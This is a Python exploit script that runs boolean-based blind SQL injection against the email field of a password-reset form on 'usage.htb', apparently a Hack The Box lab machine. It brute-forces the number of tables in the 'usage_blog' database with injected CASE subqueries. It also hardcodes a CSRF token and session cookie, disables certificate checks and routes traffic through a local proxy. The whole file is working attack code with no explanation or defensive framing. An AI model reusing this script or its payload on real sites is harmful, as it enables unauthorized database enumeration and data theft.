import sys
import requests
import urllib3

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Proxy configuration if needed
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def count_tables(url):
    for count in range(1, 101):  # Adjust range as needed
        sqli_payload = f"admin23@gmail.com' AND (SELECT CASE WHEN ((SELECT COUNT(*) FROM information_schema.tables WHERE table_schema = 'usage_blog') = {count}) THEN 'true' ELSE 'false' END) = 'true' -- -"
        form_data = {
            '_token': 'miPTGCULeiTvXWQaLMsb1UgCAtlx6ItYOc1e4FWV',
            'email': sqli_payload
        }
        headers = {
            "Host": "usage.htb",
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate, br",
            "Content-Type": "application/x-www-form-urlencoded",
            "Origin": "http://usage.htb",
            "Connection": "close",
            "Referer": "http://usage.htb/forget-password",
            "Upgrade-Insecure-Requests": "1",
            "Cookie": "XSRF-TOKEN=miPTGCULeiTvXWQaLMsb1UgCAtlx6ItYOc1e4FWV; laravel_session=eyJpdiI6InpMVFpBcWNIWjNTRXpXa29HNWlaOVE9PSIsInZhbHVlIjoiTEVOZjhPRVg5OXpneE11eUVycUZjNW9wZzdCcWlqd3lUWHYrYURsWGpJWmVyZFV1OWtSbXVXZmhmR0p1YVhpb3d0QjFUV2FpQVJHVVZaeGVnV3hwRmJzeU5OYWdETFJwUHJlWkNtL0ZLV0FxaC9RSjZvQm1MMUZQTlNpV3RSL0wiLCJtYWMiOiI1NzUzOTA5YjljNzg3OWU1MmM1NTEzNzUzNjMxNGYzMzE2YmZhY2U4OTM0MWRhYmE5MGI1NzZlYzhlODNhMjRhIiwidGFnIjoiIn0%3D"
        }
        response = requests.post(url, data=form_data, headers=headers, verify=False, proxies=proxies, allow_redirects=True)
        sys.stdout.write('\rTesting number of tables: ' + str(count))
        sys.stdout.flush()
        if "admin23@gmail.com" in response.text:  # Check if email address is in response text
            print(f"\n(+) Number of tables in database: {count}")
            return count
    return 0

def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s http://example.com" % sys.argv[0])
        sys.exit(1)

    url = sys.argv[1]
    print("(+) Counting tables...")
    table_count = count_tables(url)

if __name__ == "__main__":
    main()